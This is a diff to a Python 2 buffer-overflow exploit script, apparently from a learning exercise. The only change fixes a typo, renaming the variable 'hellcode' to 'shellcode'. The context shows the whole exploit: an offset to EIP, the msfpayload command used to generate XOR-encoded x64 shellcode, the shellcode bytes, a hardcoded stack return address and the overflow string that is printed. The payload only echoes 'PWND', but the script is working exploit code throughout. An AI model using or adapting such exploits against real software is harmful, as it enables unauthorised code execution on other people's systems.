@@ -9,7 +9,7 @@ offset_to_eip = 136
 # msfpayload linux/x64/exec CMD="echo PWND" R | msfencode -b '\x00' -e x64/xor -t c
 # [*] x64/xor succeeded with size 95 (iteration=1)
 
-hellcode = (
+shellcode = (
 "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05\xef\xff"
 "\xff\xff\x48\xbb\xc5\xb6\x57\xcc\xbf\x7a\x60\xc7\x48\x31\x58"
 "\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xaf\x8d\x0f\x55\xf7\xc1"
@@ -23,6 +23,6 @@ hellcode = (
 # (64 bit address) are already on the stack.
 eip = "\xb0\xdb\xff\xff\xff\x7f"
 
-string = hellcode + ("\x24\xFF" * 20) + "\x90" + eip # hardcoded, nasty
+string = shellcode + ("\x24\xFF" * 20) + "\x90" + eip # hardcoded, nasty
 
 print string
